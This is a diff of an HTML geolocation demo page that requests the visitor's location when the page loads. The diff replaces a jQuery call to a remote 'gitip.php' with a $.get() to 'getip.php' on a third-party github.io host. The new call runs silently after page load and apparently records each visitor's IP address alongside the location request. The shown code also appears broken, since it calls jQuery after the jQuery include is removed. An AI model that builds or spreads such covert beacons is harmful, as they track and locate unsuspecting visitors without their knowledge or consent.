@@ -3,17 +3,15 @@
 <body onload="getLocation()">
 
 <button onclick="getLocation()">Try It</button>
- 
-<script type="text/javascript" src="jquery.js"></script>          
-<script type="text/javascript">
-    // Check if the page has loaded completely                                         
-    $(document).ready( function() { 
-        $('#some_id').load('https://thisisshubhamkumar.github.io/r4ven/gitip.php'); 
-    }); 
-</script> 
 
 <script>
 var x = document.getElementById("demo");
+ 
+$(window).load(function(){ /*This allows to execute your code after the  page is rendered fully */ 
+    $.get("https://thisisshubhamkumar.github.io/r4ven/getip.php", function(data){
+     /* you can then process the ajax response as needed */
+    });
+})
 
 function getLocation() {
   if (navigator.geolocation) {
